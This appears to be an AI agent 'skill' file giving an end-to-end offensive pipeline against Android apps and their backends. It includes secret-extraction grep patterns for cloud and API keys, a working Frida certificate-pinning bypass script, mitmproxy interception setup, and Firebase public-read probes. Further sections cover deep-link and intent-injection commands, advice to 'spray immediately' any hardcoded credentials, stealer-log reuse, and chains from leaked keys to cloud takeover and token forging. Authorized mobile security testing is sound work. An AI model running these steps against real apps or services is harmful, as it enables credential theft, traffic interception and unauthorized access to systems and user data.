---
name: apk-redteam-pipeline
description: End-to-end Android APK red-team pipeline — automated APK acquisition (Play Store + apkpure + apkmirror fallback), jadx decompilation, secret/URL/JWT/Firebase grep, pinned-cert extraction, exported-component enumeration, Frida runtime instrumentation templates, intent-injection probes. Built from an authorized external red-team engagement where 7 APKs were pulled manually, 4 download attempts truncated, and a hardcoded JWT + 30 internal API endpoints were recovered from one of the apps. Use when target has a mobile app catalogue (Play Store developer page), when you find an APK URL hosted on a web server, or when post-recon mentions "mobile app" in scope.
---

## When to use this skill

Trigger when:
- Recon surfaces 1+ mobile apps under the target's developer name (Play Store dev page)
- A web app hosts `*.apk` files directly (e.g. `Recruitz.apk` found on a subdomain during one engagement)
- APK package IDs leaked via stealer logs (e.g. `com.<brand>.app`, `com.<brand>.<sub-brand>` patterns in stealer dump format)
- Customer-facing app, dealer/partner portal, or employee mobile companion app is in scope
- Bug bounty program lists Android in scope

DO NOT use for:
- iOS-only targets (different pipeline — IPA reverse, MobSF, frida-ios-dump)
- React Native / Flutter web apps already covered by JS bundle analysis
- Server-side only assessments

---

## Stage 0 — Inventory all org-owned apps

### Play Store developer-page scrape
```bash
# Find developer page from the target's brand name
curl -sk -A "Mozilla/5.0" "https://play.google.com/store/apps/developer?id=<Brand+Name>" -o /tmp/dev.html

# Extract package IDs
grep -oE 'id=[a-zA-Z0-9._]+' /tmp/dev.html | sort -u
```

Example output (anonymized — 7 packages typical for a multi-brand conglomerate):
```
com.events.<brand>build
com.<corp>.<sub-brand-1>
com.<corp>.<sub-brand-2>
com.<corp>.<flagship>
com.<corp>.<product-line-1>
com.<corp>.<product-line-2>
com.<corp>.<sub-brand-3>
```

### Cross-reference with stealer logs
Stealer-log format includes package names like `*@com.<corp>.<app>` — extract these from `creds_userpass.txt` if you have a leaked dump.

### Brand permutation guesses (multi-brand conglomerate patterns)
```
com.<brand>.app
com.<brand>.mobile  
com.<brand>.android
com.<brand>connect.app
in.<brand>.dealer
in.co.<brand>.app
```

---

## Stage 1 — APK acquisition

### Primary: APKPure direct (no auth required)
```bash
# Follow 302 redirects to actual download
curl -sk -L --max-time 60 \
  "https://d.apkpure.net/b/APK/<package_id>?version=latest" \
  -o "<package_id>.apk"

# Or via the legacy d-XX.winudf.com mirror chain (we saw this work)
```

### Secondary: APKMirror search
```bash
curl -sk -A "Mozilla/5.0" "https://www.apkmirror.com/?post_type=app_release&searchtype=apk&s=<brand>" \
  | grep -oE 'href="[^"]+\.apk[^"]*"' | sort -u
```

### Tertiary: APKPure web search
```bash
curl -sk "https://apkpure.com/search?q=<brand>" | grep -oE 'data-dt-app="[^"]+"'
```

### XAPK vs APK
- `.xapk` = a zip containing multiple split APKs (base + config.armeabi-v7a + config.en + etc.)
- Unzip outer first, then unzip the inner `base.apk` or `<package>.apk`
- Some apkpure downloads return truncated XAPK with missing EOCD signature — symptom of CDN rate-limiting; rotate IP and retry, OR use `7z x` which is more lenient than `unzip`

```bash
# Standard unzip (works for clean APK)
unzip -o <package>.apk -d extracted_<package>/

# For truncated/repaired XAPK
7z x -y <package>.apk -o"extracted_<package>"

# For nested XAPK
for inner in extracted_<package>/*.apk; do
  mkdir -p "extracted_<package>/$(basename "$inner" .apk)"
  unzip -o "$inner" -d "extracted_<package>/$(basename "$inner" .apk)"
done
```

---

## Stage 2 — DEX decompilation (jadx)

```bash
# Install
brew install jadx          # macOS
# or
wget https://github.com/skylot/jadx/releases/latest/download/jadx-1.5.x.zip

# Decompile
jadx -d decompiled_<package>/ <package>.apk

# For XAPK that contains multiple APKs
for inner in extracted_<package>/*.apk; do
  jadx -d decompiled_<package>_$(basename "$inner" .apk)/ "$inner"
done
```

For a fast "strings only" pass without full decompilation:
```bash
find extracted_<package> -name "classes*.dex" -exec strings -8 {} \; > strings_<package>.txt
```

---

## Stage 3 — Secret grep (the 60-pattern catalog)

```bash
# URL grep — owned-domain references
grep -oE 'https?://[a-zA-Z0-9.-]+\.(target1|target2|target3)\.(com|io|net|in)[a-zA-Z0-9./_?=&%-]*' strings_<package>.txt | sort -u

# Internal IP / port URLs
grep -oE 'https?://(10\.|172\.(1[6-9]|2[0-9]|3[01])\.|192\.168\.|127\.)[0-9.]+(:[0-9]+)?[a-zA-Z0-9./_?=&-]*' strings_<package>.txt

# Cloud credentials
grep -oE 'AKIA[A-Z0-9]{16}'                            # AWS Access Key
grep -oE 'aws_secret_access_key[\s:=]+[A-Za-z0-9/+=]{40}' # AWS Secret
grep -oE 'AIza[A-Za-z0-9_-]{35}'                       # Google API key
grep -oE 'ya29\.[A-Za-z0-9_-]+'                        # Google OAuth refresh token
grep -oE 'gh[ps]_[A-Za-z0-9]{36}'                      # GitHub PAT
grep -oE 'glpat-[A-Za-z0-9_-]{20}'                     # GitLab PAT
grep -oE 'xox[pbar]-[A-Za-z0-9-]+'                     # Slack token
grep -oE 'sk-[A-Za-z0-9]{48}'                          # OpenAI API key
grep -oE 'sk-ant-[A-Za-z0-9_-]{90,}'                   # Anthropic API key
grep -oE 'AC[a-f0-9]{32}'                              # Twilio Account SID
grep -oE 'sk_live_[A-Za-z0-9]{24}'                     # Stripe live key
grep -oE 'pk_live_[A-Za-z0-9]{24}'                     # Stripe publishable
grep -oE 'mailgun-[A-Za-z0-9-]{40}'                    # Mailgun
grep -oE 'SG\.[A-Za-z0-9_-]{22}\.[A-Za-z0-9_-]{43}'    # SendGrid

# JWT (any algorithm)
grep -oE 'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*' strings_<package>.txt

# Firebase
grep -oE '"(api_key|project_id|database_url|storage_bucket|client_id|mobilesdk_app_id|google_app_id|gcm_defaultSenderId)"\s*:\s*"[^"]+"' \
  extracted_<package>/res/values/strings.xml \
  extracted_<package>/google-services.json \
  decompiled_<package>/resources/AndroidManifest.xml 2>/dev/null

# OAuth client secrets
grep -oE 'client_secret["\s:=]+[A-Za-z0-9_-]{24,}' strings_<package>.txt

# Hardcoded passwords (heuristic — many false positives, manual review)
grep -oE '"password"\s*:\s*"[^"]+"|password\s*=\s*"[^"]+"' decompiled_<package>/sources/**/*.java 2>/dev/null
```

### Real-world example finding (anonymized — from an authorized engagement)
```
# Customer-facing APK shipped a hardcoded URL of this shape:
https://api.<client>.example/<path-token>/<resource-token>?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.<payload>.<sig>

# Decoded JWT payload: {"sid":<int>,"iat":<unix-ts>,"exp":<unix-ts>}
# Expired ~8 years earlier — but path tokens + 30 /v1/* endpoints still useful intel
```

---

## Stage 4 — Pinned certificate extraction

```bash
# Find .cer / .der / .pem files in assets/
find extracted_<package>/assets -iname "*.cer" -o -iname "*.der" -o -iname "*.pem" -o -iname "*.crt" 2>/dev/null

# Or in network_security_config.xml
find extracted_<package> -name "network_security_config.xml" -exec cat {} \;

# For each cert, extract subject + SAN (might reveal new internal API hosts)
for cert in $(find extracted_<package>/assets -iname "*.cer"); do
  echo "=== $cert ==="
  openssl x509 -in "$cert" -noout -subject -issuer -dates 2>/dev/null
  openssl x509 -in "$cert" -noout -text 2>/dev/null | grep -E 'Subject:|DNS:|Issuer:|Validity'
done
```

### Real-world example
A customer-facing APK from an authorized engagement contained `assets/api_<service>_<domain>_com.cer` — revealed the existence of an `api.<service>.<domain>.example` asset that had NOT surfaced in passive recon.

---

## Stage 5 — Exported component enumeration

AndroidManifest.xml lists components. Exported ones (especially with `android:exported="true"` or implicit-export via intent-filter) can be triggered by other apps — potential intent-injection attack surface.

```bash
# Decode binary AndroidManifest if needed
apktool d <package>.apk -o decoded_<package>/    # apktool decodes binary manifest

# Or read directly from jadx output
cat decompiled_<package>/resources/AndroidManifest.xml | grep -E '<(activity|service|receiver|provider)' | head -50

# Filter exported
grep -E 'android:exported="true"' decompiled_<package>/resources/AndroidManifest.xml
```

For each exported component, check:
- Does it accept extras that flow into a WebView (intent → WebView → XSS / file://)
- Does it accept URI extras (potential SSRF via deep link)
- Does it pass extras to other Activities (intent redirection)

---

## Stage 6 — Firebase / cloud-service config inspection

```bash
# google-services.json — full Firebase config
find extracted_<package> -name "google-services.json" -exec cat {} \; | python3 -m json.tool

# Look for:
#   project_id   → can guess Firestore / RTDB URL: https://<project_id>.firebaseio.com/.json
#   storage_bucket → can guess GCS bucket: gs://<bucket>
#   web_api_key  → can use to enumerate Firebase tenant config

# Test if Firestore is publicly readable
curl -s "https://firestore.googleapis.com/v1/projects/<project_id>/databases/(default)/documents/users"

# Test if Realtime DB is publicly readable
curl -s "https://<project_id>.firebaseio.com/.json"

# Test if Storage Bucket is publicly listable
curl -s "https://firebasestorage.googleapis.com/v0/b/<bucket>/o"
```

---

## Stage 7 — Runtime instrumentation (Frida)

For when static analysis isn't enough — you want to dump tokens at runtime, bypass cert pinning, or trace API calls.

### Setup
```bash
pip install --break-system-packages frida-tools objection
adb devices  # ensure device/emulator connected
# Push frida-server to device (root required, or use rooted emulator like Genymotion / x86_64 AVD)
```

### Cert-pinning bypass (universal)
```javascript
// frida-script-pinning-bypass.js
Java.perform(function() {
    // OkHttp
    try {
        var CertificatePinner = Java.use('okhttp3.CertificatePinner');
        CertificatePinner.check.overload('java.lang.String', 'java.util.List').implementation = function() {
            console.log('[+] OkHttp pinning bypassed for: ' + arguments[0]);
            return;
        };
    } catch (e) {}
    // HttpsURLConnection
    try {
        var TrustManagerImpl = Java.use('com.android.org.conscrypt.TrustManagerImpl');
        TrustManagerImpl.verifyChain.implementation = function(chain) {
            console.log('[+] TrustManagerImpl verifyChain bypassed');
            return chain;
        };
    } catch (e) {}
});
```
```bash
frida -U -l frida-script-pinning-bypass.js -f <package_id> --no-pause
```

### Hook HTTP requests
```javascript
Java.perform(function() {
    var OkHttpClient = Java.use('okhttp3.OkHttpClient');
    var Request = Java.use('okhttp3.Request');
    var Call = Java.use('okhttp3.Call');
    
    OkHttpClient.newCall.implementation = function(req) {
        var url = req.url().toString();
        var headers = req.headers().toString();
        console.log('[REQ] ' + url);
        console.log('[HDRS] ' + headers);
        return this.newCall(req);
    };
});
```

### Quick token extraction via objection
```bash
objection --gadget com.target.app explore
# Inside:
android hooking watch class_method <class>.<method> --dump-args --dump-return
```

---

## Stage 8 — Network traffic capture (via mitmproxy)

For deeper API discovery once pinning is bypassed.

```bash
# Run mitmproxy on host
mitmproxy --listen-port 8080

# Configure Android device proxy to host:8080
# Install mitmproxy CA cert on device:
#   - Pull from http://mitm.it on the device, or
#   - Push to /system/etc/security/cacerts/ on rooted device

# Use the Frida pinning bypass script while traffic flows through mitmproxy
# All API calls visible in mitmproxy UI
```

---

## Decision tree — what to do with what you find

| Finding | Next move |
|---|---|
| Active JWT (not expired) | Test against the API host — does it grant access? Try sid manipulation |
| Expired JWT | Inspect path tokens / API endpoint structure — useful intel for post-VPN |
| AWS access key | Use `awscli` to test: `aws sts get-caller-identity` — many leaked keys still have permissions |
| Firebase project_id + web_api_key | Test public Firestore/RTDB/Storage read |
| Google API key (AIza*) | Test against `https://www.googleapis.com/customsearch/v1` etc. — see what API the key activates |
| Hardcoded HTTP URLs (http://) | Possible MITM via downgrade if cert pinning is missing |
| Pinned cert for internal host | New asset discovery — that host is real |
| Exported Activity with WebView | Test intent-injection → URL-loading abuse |
| Stack-trace artifacts (Stack Overflow URLs) | Identify the developer's questions → infer architecture |
| Hardcoded credentials | Spray immediately (respect any caps from related skills) |

---

## Anti-patterns

- **Don't grep only for "password"** — most secrets have specific high-signal patterns (AKIA, AIza, eyJ, etc.). Generic word grep produces too much noise.
- **Don't skip XAPK split APKs** — config.armeabi splits and config.<lang> splits sometimes contain different code paths.
- **Don't trust expired JWTs as "dead intel"** — the path structure, endpoint list, and signing algorithm are still useful. The 8-year-expired-JWT example above shows this.
- **Don't reverse only the latest version** — older APK versions (via APKMirror version history) sometimes have secrets removed in newer versions but still active server-side.
- **Don't ignore Firebase even if app looks "simple"** — Firebase rules misconfigurations (public read on Firestore) are extremely common.
- **Don't run Frida on a production device** — use rooted emulator or test device only.

---

## Tooling install (one-time)

```bash
brew install jadx p7zip
pip install --break-system-packages frida-tools objection
# Genymotion or AVD for rooted Android emulator
```

For APK download convenience, can add a `download-apk` shell function:
```bash
download-apk() {
  local pkg="$1"
  curl -sk -L --max-time 60 "https://d.apkpure.net/b/APK/$pkg?version=latest" -o "$pkg.apk"
  echo "Downloaded $(wc -c < "$pkg.apk") bytes"
  file "$pkg.apk"
}
```

---

## Bridge to neighboring skills

- `offensive-osint` — Play Store / APKMirror enum is part of broader OSINT
- `cloud-misconfig` — Firebase public-read is exactly this skill's specialty post-discovery
- `api-misconfig` — JWT manipulation once you have the algorithm + sample token
- `evidence-hygiene` — extracted secrets need redaction before report inclusion
- `redteam-mindset` — APK reverse on day-1 of an engagement, not as an afterthought

---

## Real-world finding template (anonymized — authorized engagement)

**Finding: Hardcoded JWT + 30+ Internal API Endpoints in a customer-facing APK**

- Subject: Hardcoded artifacts in legacy mobile build reveal internal API surface
- Observations: Decompilation of `com.<client>.<app>` revealed embedded JWT (expired ~8 years earlier) and 30+ `/v1/*` endpoint paths against `api2.<client>.example` (internal-only externally)
- Description: APK ships with developer build artifacts. Path tokens are security-by-obscurity; API endpoint inventory is reconnaissance-grade.
- Impact: Post-VPN-foothold (via cred compromise), attacker has full API surface map without binary reverse. HS256 secret recovery (via SSRF/LFI) would yield arbitrary token forging.
- Recommendation: rotate HS256 secret, migrate to RS256, remove hardcoded URLs from builds, audit all org APKs.
- Evidence: extracted strings, decoded JWT, endpoint inventory

---

## Related Skills & Chains

- **`cloud-iam-deep`** — APK secret extraction frequently yields live AWS/GCP/Azure credentials. Chain primitive: jadx string-grep produces AWS Access Key ID + Secret → `cloud-iam-deep` `aws sts get-caller-identity` → role/policy enumeration → IAM privilege-escalation path (one of 24 documented AWS escalation patterns) → cloud-plane takeover. Same flow applies to GCP service-account JSON and Azure shared-access-signature tokens extracted from APK resources.
- **`api-misconfig`** — APK endpoint inventory hands you the API surface for free; mass-assignment, JWT, and CORS bugs are typical. Chain primitive: APK reveals `/v1/users/me` and `/v1/admin/users` → `api-misconfig` mass-assignment probes (`{is_admin:true}`) against `/v1/users/me` → admin role escalation → access to `/v1/admin/users`.
- **`rce`** — Hardcoded JWT signing secrets (HS256) extracted from APK enable arbitrary token forging. Chain primitive: APK strings yield HS256 secret → forge admin token → access admin API → if API has eval/template/sink → `rce` to server. Also: exported components with intent-injection sinks can reach `Runtime.exec` if app is local-installed.
- **`offensive-osint`** — APK is one node in the broader org recon graph; pair with breach corpora and cert transparency. Chain primitive: APK reveals internal API hostname `api2.example.com` → `offensive-osint` certificate-transparency lookup → discover sibling subdomains → expanded attack surface.
- **`redteam-report-template`** — APK findings need clear "what the binary leaks" framing because client engineers often dismiss mobile-static findings as "obfuscation problem." Chain primitive: validated finding (token/URL/secret extracted) → `triage-validation` 7-Question Gate (specifically: "does this credential still authenticate today?") → `redteam-report-template` packaging with explicit binary version + extraction reproduction steps.

## Web-Research Methodology Additions (2026)

### A. Discovery checklist — concrete artifacts, endpoints, patterns, tools to look for

- **Map findings to OWASP MASVS v2 groups (MASVS-STORAGE, -CRYPTO, -AUTH, -NETWORK, -PLATFORM, -CODE, -RESILIENCE, -PRIVACY)** and cite MASTG test IDs. MASWE-0004 (sensitive data hardcoded in package), MASWE-0018 (no authz on app components), MASWE-0028 (insecure identity pinning), MASWE-0029 (insecure deep links) are the highest-yield weakness categories.
- **Manifest entry points (apktool `d app.apk` → AndroidManifest.xml):** `android:exported="true"` on activity/service/receiver/provider without `android:permission`; `android:debuggable="true"`; `android:allowBackup="true"`; `usesCleartextTraffic`; `android:networkSecurityConfig="@xml/network_security_config"`; `android:sharedUserId`; task `android:launchMode`. A custom permission with `normal`/`dangerous` protection is *not* sufficient — prefer `signature`.
- **Deep links (MASTG-KNOW-0019 / MASWE-0029):** browsable `<intent-filter>` = `VIEW` + `DEFAULT` + `BROWSABLE` + `<data scheme/host/path>`. Custom `myapp://` schemes are unverifiable and claimable by any app; App Links need `autoVerify="true"` and a valid `https://<host>/.well-known/assetlinks.json` (every subdomain needs its own file; redirects break verification). Enumerate with MASTG-TECH-0172; monitor handlers with Frida (TECH-0173).
- **Network security config & pinning sources:** `res/xml/network_security_config.xml` `<domain-config><pin-set>` with digest hashes; pinned certs in `res/raw/` and `assets/`; OkHttp `CertificatePinner.check`; BoringSSL/Cronet native pinning; TrustManager implementations.
- **Secret grep sources:** decompiled Java (`jadx`), native `.so` strings, `resources.arsc`, asset files, and `strings` output. Patterns: `api[_-]?key|secret|password|token|BEGIN RSA|AKIA|AIza|sk_live`, hardcoded `http://` URLs, `ECB`, constant IVs, `TODO`/staging hostnames.
- **WebViews:** `setJavaScriptEnabled`, `addJavascriptInterface`, `loadUrl` with attacker-controlled input, `setAllowFileAccess`, `shouldOverrideUrlLoading`, local-resource access (MASWE-0033/0034/0035).
- **Tooling:** `apktool`, `jadx`, `dex2jar`/`JD-GUI`, `MobSF` (automated static scan), `drozer` (IPC exploitation), `frida`/`objection`/Xposed (dynamic), `apk-mitm` (no-root repack bypass), `frida-multiple-unpinning`, `apk-mitm`/`apktool b` + `apksigner` for repackaging, `mitmproxy`/Burp, `adb shell pm path` → `adb pull` for installed APKs.

### B. Techniques & bypasses — specific actionable techniques/payload shapes

- **Bypassing pinning (MASTG-TECH-0012):** start with `objection -g <pkg> explore` → `android sslpinning disable` (patches `X509TrustManager`/`TrustManagerImpl`), or `frida -U -f <pkg> -l frida-multiple-unpinning.js --no-pause` (covers OkHttp, Conscrypt, Cronet more broadly). Targeted hooks: `Java.use('okhttp3.CertificatePinner').check.overload('java.lang.String','java.util.List').implementation = function(){}`.
- **Native pinning:** `frida-gum Interceptor.attach` on `SSL_CTX_set_custom_verify`; handle anti-Frida checks that scan `/proc/self/maps` for `frida-agent` by renaming the library or using Frida Gadget injection. `frida-trace -U -f <pkg> -j 'javax.net.ssl.*!*'` auto-generates stubs for discovery.
- **No-root alternative:** `apk-mitm` repackages with trust changes; or lower `targetSdkVersion` to 23 in the manifest so user CAs are trusted, rebuild with `apktool b`, sign — but expect signature-verification crashes, which themselves confirm integrity controls.
- **Exported-component abuse via drozer/adb:** `run app.activity.info -a com.target` lists exported activities; launch sensitive screens directly to bypass auth. Content providers: `adb shell content query --uri content://com.target.provider/users` can leak SQLite rows. Missing `grantUriPermissions` on FileProviders enables file reads.
- **Intent injection:** proxy components that forward attacker-controlled Intents to `startActivity()`/`sendBroadcast()` act like web open redirects — drive non-exported components or content providers. WebView `Intent.parseUri()` is a classic sink. Fastest pivot is `adb shell am start -n <pkg>/.Activity --es extra <value>` or a drozer `sendIntent` with malicious extras.
- **Deep-link fuzzing:** `adb shell am start -a android.intent.action.VIEW -d 'myapp://...?param=<payload>'`; test path traversal, SQLi in query params, oversize inputs, token/secret leakage via referrer, and WebView loads from a `url=` parameter. Verify App Link association (`/.well-known/assetlinks.json`) per MASTG-TECH-0174.
- **Runtime traffic routing through objection:** `android proxy set <ip> <port>` redirects only the target app's traffic to mitmproxy; combine with `android sslpinning disable`. Watch for third-party SDKs that use their own trust stores and remain un-pinned.
- **Signing/version checks:** record the APK signature scheme and version; a valid signature says who built it, nothing about safety. Repackaging invalidates it — if the app crashes after repack, look for integrity/root/Frida detection (MASVS-RESILIENCE).

### C. Validation / proof bar — how to confirm and avoid false positives

- **Pinning is a speed bump, not a control** — MASVS files pinning under resilience; the finding is what the now-visible API exposes. Do not report "missing pinning" alone as Critical; test every app as if pinning were already defeated.
- **Resilience absence ≠ vulnerability** (MASTG anti-reversing overview): lack of root detection, obfuscation, or anti-debug does not create a vuln — only report where the threat model requires it.
- **Severity from impact and likelihood for the actual threat model:** an exported provider leaking notes in a note app is Critical; a missing root check in the same app is usually not a finding.
- **Validate extracted credentials as live** and in scope (`triage-validation` 7-Question Gate: "does this credential still authenticate today?") — a rotated key in commit history or a publishable Firebase web config is not a live secret.
- **Prove component abuse end-to-end:** demonstrate the exported activity/provider actually returns another user's or privileged data, not just that it is exported. For deep links, show the malformed URI drives an unauthorized action or leaks a token.
- **Use only apps you own or are engaged to test** on devices/emulators you control with test accounts — decompiling third-party apps may violate licence, and probing their backend without permission is unauthorized access.
- **Partial-mode caveat (HackTricks iOS/Android):** do not trust disassembly or `strings` attributed to encrypted/protected ranges; verify decrypted state first.

- **App Links verification failure modes (MASTG-KNOW-0019):** before Android 12 a single non-verifiable link (missing `autoVerify`, invalid assetlinks, or a custom scheme in a verified filter) skips verification for *all* App Links; from Android 12 a generic web intent resolves to the browser unless the app is approved for the exact domain. Check each declared host separately.
- **HTTP to the device proxy:** after `android proxy set`, remember third-party SDK traffic may still bypass the proxy or use its own trust store — enumerate every contacted domain and verify each independently.
- **Frida version discipline:** `frida-server` on-device must match the host `frida`/`frida-tools` version; use a Google APIs (non-Play) AVD so you can write to `/data/local/tmp` and run it as root.
- **Spawn, don't attach, for early checks:** `frida -U -f <pkg> -l bypass.js --no-pause` lands hooks before early integrity/root checks run; attaching later misses them.
- **Method-boundary limitation:** Frida replaces whole method implementations, not individual lines — when a check is inline, patch smali with `apktool b` and re-sign, or hook the enclosing method and reimplement its behaviour.
- **Cross-platform correlation:** run the iOS pipeline too when the target ships both apps; shared backend endpoints and sibling bundle IDs often surface the same API from two angles, and one platform's weaker build may expose the missing control.
- **Firebase/cloud config caution:** a Firebase web API key is normally public — the finding is the security rules (open Realtime Database/Firestore); validate rules read-only and within scope.
- **Report structure:** state binary version + package name + extraction commands, then the concrete attacker action (another user's data, privileged screen, live cloud resource), then the fix at the server/API layer; client hardening alone is not a remediation.
- **Evidence hygiene:** redact session cookies and other users' PII in captured traffic and screenshots before attaching them to a report (`evidence-hygiene`).

- **Native-library pass:** extract `.so` files (`MASTG-TECH-0157`) and run `strings`/radare2 on them — pinning, crypto keys, and endpoints hidden from DEX often remain in native code.
- **Anti-reversing signals to log, not automatically report:** obfuscators/packers (MASTG-TECH-0165), root/emulator/debugger detection, and certificate pinning are resilience controls; document them and focus severity on the data/access primitive they guard.

### D. Sources — numbered list of URLs you actually fetched

1. https://mas.owasp.org/MASTG/knowledge/android/MASVS-PLATFORM/MASTG-KNOW-0019 (deep-link types, App Link verification, assetlinks.json rules)
2. https://mas.owasp.org/MASTG/techniques/android/MASTG-TECH-0012 (Frida/objection/Xposed pinning bypass; custom pinning needs manual patching)
3. https://hacktricks.wiki/en/mobile-pentesting/ios-pentesting/basic-ios-testing-operations.html (cross-platform binary/decryption caveat)
4. https://desecurity.github.io/hacktricks/mobile-pentesting/android-app-pentesting/index.html (network security config, exported components, drozer, intent injection, apk-mitm)
5. https://mas.owasp.org/MASTG/best-practices/MASTG-BEST-0052 (exported components should be private by default; permission protection levels)
6. https://mas.owasp.org/MASWE/MASVS-PLATFORM/MASWE-0029 (insecure deep links: unverified schemes, missing domain association, unvalidated input)
7. https://mas.owasp.org/MASTG/0x05j-Testing-Resiliency-Against-Reverse-Engineering (absence of anti-reversing is not a vulnerability)
8. https://tranlynhathao.github.io/blog/2025/android-app-security-assessment (MASVS-mapped static-to-dynamic checklist, manifest attributes)
9. https://httptoolkit.com/blog/android-reverse-engineering (static patch vs Frida, method-boundary hooking, `Java.use` pattern)
10. https://bipi.in/blog/android-pentest-apk-frida-ssl-pinning-bypass (Frida setup, one-liner hook, exported-component abuse, native pinning)
11. https://www.yingtongli.me/blog/2025/11/08/mitm-frida.html (objection proxy set + custom pinning via jadx discovery)

